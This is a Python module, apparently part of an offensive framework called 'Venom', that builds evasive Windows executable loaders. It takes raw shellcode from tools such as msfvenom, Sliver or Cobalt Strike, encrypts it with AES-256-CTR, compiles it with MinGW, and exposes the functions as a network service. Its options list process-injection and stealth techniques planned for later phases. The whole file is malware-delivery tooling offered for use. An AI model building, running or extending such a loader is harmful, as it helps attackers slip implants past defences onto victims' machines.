"""Venom loader-builder module — Phase 1 MVP.

Exposed manifest functions:
  - init_recipe(payload, payload_type)
  - set_encryption(recipe, algorithm)
  - set_compiler(recipe, toolchain, language)
  - set_injection(recipe, target, target_process)
  - compile_loader(recipe, output_format, output_name)
  - build_loader_full(payload, output_format, output_name, payload_type)
      Composite shortcut: init + defaults + compile in one call.

Operator composes the atomic ones into Venom pipelines for fine control,
or uses build_loader_full as a single node for the common case.

Phase 1 supports:
  encryption.algorithm   = aes256_ctr
  encoding.type          = raw_bytes
  compiler.toolchain     = mingw_gcc
  compiler.language      = c
  injection.target       = self
  output_format          = exe_x64

All other params are recorded in the recipe but no-ops at compile time until
later phases add the corresponding submodule templates.
"""
from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

# Make the local recipe / orchestrator packages importable
HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent.parent / "module-sdk"))

from venom_module_sdk import VenomModule, Param  # noqa: E402

from recipe import Recipe, init_from_payload, validate  # noqa: E402
from orchestrator.compose import compose  # noqa: E402
from orchestrator.build import compile_loader as build_loader, BuildError  # noqa: E402


module = VenomModule(
    name="loader-builder",
    version="0.1.0",
    platform="linux",
    description=(
        "Build evasive Windows PE loaders from raw shellcode. Composable: chain "
        "atomic set_* / add_* functions in a Venom pipeline, or call build_loader_full "
        "for the common case."
    ),
    category="loader",
)


def _write_recipe(recipe: Recipe) -> str:
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".recipe.json", mode="w")
    tmp.write(recipe.to_json())
    tmp.flush()
    tmp.close()
    return tmp.name


def _read_recipe(path: str) -> Recipe:
    with open(path, "r") as f:
        return Recipe.from_json(f.read())


# ---------------------------------------------------------------------------
# Atomic — init
# ---------------------------------------------------------------------------

@module.function(
    name="init_recipe",
    description="Initialize a loader recipe with the payload. First step of every pipeline.",
    params=[
        Param("payload", type="file", required=True, accepts="binary",
              description="Raw shellcode (msfvenom/Havoc/Sliver/Cobalt) or PE/.NET assembly"),
        Param("payload_type", type="enum", required=True,
              options=["raw_shellcode", "pe_binary", "dotnet_assembly", "bof_object"],
              description="What kind of payload — affects how it is wrapped before encryption"),
    ],
    returns={"type": "file", "name": "recipe", "produces": "venom_recipe",
             "description": "Recipe JSON (intermediate state for the loader build)"},
)
def init_recipe(payload: str, payload_type: str) -> str:
    if payload_type != "raw_shellcode":
        raise NotImplementedError(
            f"payload_type={payload_type} not supported in Phase 1 MVP. "
            "Today only raw_shellcode. PE/DotNet wrapping comes via Donut in Phase 5."
        )
    with open(payload, "rb") as f:
        payload_bytes = f.read()
    if len(payload_bytes) == 0:
        raise ValueError("payload is empty")
    recipe = init_from_payload(payload_bytes, payload_type)
    return _write_recipe(recipe)


# ---------------------------------------------------------------------------
# Atomic — set_encryption
# ---------------------------------------------------------------------------

@module.function(
    name="set_encryption",
    description="Pick the encryption algorithm used for the embedded shellcode.",
    params=[
        Param("recipe", type="file", required=True, accepts="venom_recipe"),
        Param("algorithm", type="enum", required=True,
              options=["aes256_ctr", "aes256_cbc", "chacha20", "rc4", "xor_rolling"],
              description="Phase 1 MVP only implements aes256_ctr."),
    ],
    returns={"type": "file", "name": "recipe", "produces": "venom_recipe"},
)
def set_encryption(recipe: str, algorithm: str) -> str:
    r = _read_recipe(recipe)
    r.encryption.algorithm = algorithm
    if algorithm != "aes256_ctr":
        # record the choice but compile_loader will refuse — clearer error message there
        pass
    return _write_recipe(r)


# ---------------------------------------------------------------------------
# Atomic — set_compiler
# ---------------------------------------------------------------------------

@module.function(
    name="set_compiler",
    description="Pick the compiler toolchain and source language.",
    params=[
        Param("recipe", type="file", required=True, accepts="venom_recipe"),
        Param("toolchain", type="enum", required=True,
              options=["mingw_gcc", "msvc", "clang_msvc", "nim", "rust"],
              description="Phase 1 MVP only implements mingw_gcc."),
        Param("language", type="enum", required=True,
              options=["c", "cpp", "nim", "rust"],
              description="Phase 1 MVP only implements c."),
    ],
    returns={"type": "file", "name": "recipe", "produces": "venom_recipe"},
)
def set_compiler(recipe: str, toolchain: str, language: str) -> str:
    r = _read_recipe(recipe)
    r.compiler.toolchain = toolchain
    r.compiler.language = language
    return _write_recipe(r)


# ---------------------------------------------------------------------------
# Atomic — set_injection
# ---------------------------------------------------------------------------

@module.function(
    name="set_injection",
    description="Decide where the shellcode runs.",
    params=[
        Param("recipe", type="file", required=True, accepts="venom_recipe"),
        Param("target", type="enum", required=True,
              options=["self", "early_cascade", "poolparty_tp_timer",
                       "poolparty_worker_factory", "early_bird_apc",
                       "threadless_ntdispatcher", "module_stomping", "process_ghosting"],
              description="Phase 1 MVP only implements self."),
        Param("target_process", type="string", required=False,
              description="Process to spawn or inject into (required for non-self)."),
    ],
    returns={"type": "file", "name": "recipe", "produces": "venom_recipe"},
)
def set_injection(recipe: str, target: str, target_process: str = "") -> str:
    r = _read_recipe(recipe)
    r.injection.target = target
    r.injection.target_process = target_process
    return _write_recipe(r)


# ---------------------------------------------------------------------------
# Terminal — compile_loader
# ---------------------------------------------------------------------------

@module.function(
    name="compile_loader",
    description="Validate the recipe and produce the final PE artifact.",
    params=[
        Param("recipe", type="file", required=True, accepts="venom_recipe"),
        Param("output_format", type="enum", required=True,
              options=["exe_x64", "exe_x86", "dll_x64", "dll_x86",
                       "shellcode_pic", "dll_proxy", "reflective_dll", "bof"],
              description="Phase 1 MVP only implements exe_x64."),
        Param("output_name", type="string", required=True,
              description="Base filename without extension."),
    ],
    returns={"type": "file", "name": "loader", "produces": "pe_binary",
             "description": "Compiled loader binary ready for delivery/packaging."},
)
def compile_loader(recipe: str, output_format: str, output_name: str) -> str:
    r = _read_recipe(recipe)

    # Phase 1 MVP restrictions
    if r.encryption.algorithm != "aes256_ctr":
        raise NotImplementedError(
            f"encryption.algorithm={r.encryption.algorithm} not yet implemented. "
            "Phase 1 supports aes256_ctr only."
        )
    if r.compiler.toolchain != "mingw_gcc" or r.compiler.language != "c":
        raise NotImplementedError(
            f"compiler={r.compiler.toolchain}/{r.compiler.language} not yet implemented. "
            "Phase 1 supports mingw_gcc + c only."
        )
    if r.injection.target != "self":
        raise NotImplementedError(
            f"injection.target={r.injection.target} not yet implemented. "
            "Phase 1 supports self-execution only."
        )
    if output_format != "exe_x64":
        raise NotImplementedError(
            f"output_format={output_format} not yet implemented. "
            "Phase 1 supports exe_x64 only."
        )

    errors = validate(r)
    if errors:
        raise ValueError("recipe validation failed:\n  - " + "\n  - ".join(errors))

    source, metadata = compose(r)
    try:
        out = build_loader(r, source, output_name, output_ext="exe")
    except BuildError as e:
        raise RuntimeError(f"build failed: {e}")
    return str(out)


# ---------------------------------------------------------------------------
# Composite — build_loader_full
# ---------------------------------------------------------------------------

@module.function(
    name="build_loader_full",
    description=(
        "Composite shortcut: init + minimal defaults + compile in one call. "
        "Use this when you don't need fine-grained pipeline composition."
    ),
    params=[
        Param("payload", type="file", required=True, accepts="binary",
              description="Raw shellcode bytes."),
        Param("output_name", type="string", required=True),
        Param("payload_type", type="enum", required=False,
              options=["raw_shellcode"],
              description="Phase 1 MVP only supports raw_shellcode."),
    ],
    returns={"type": "file", "name": "loader", "produces": "pe_binary"},
)
def build_loader_full(payload: str, output_name: str,
                      payload_type: str = "raw_shellcode") -> str:
    with open(payload, "rb") as f:
        payload_bytes = f.read()
    recipe = init_from_payload(payload_bytes, payload_type)
    # Phase 1 defaults
    recipe.encryption.algorithm = "aes256_ctr"
    recipe.compiler.toolchain = "mingw_gcc"
    recipe.compiler.language = "c"
    recipe.injection.target = "self"

    errors = validate(recipe)
    if errors:
        raise ValueError("recipe validation failed:\n  - " + "\n  - ".join(errors))

    source, metadata = compose(recipe)
    try:
        out = build_loader(recipe, source, output_name, output_ext="exe")
    except BuildError as e:
        raise RuntimeError(f"build failed: {e}")
    return str(out)


if __name__ == "__main__":
    module.run(host="0.0.0.0", port=5051)
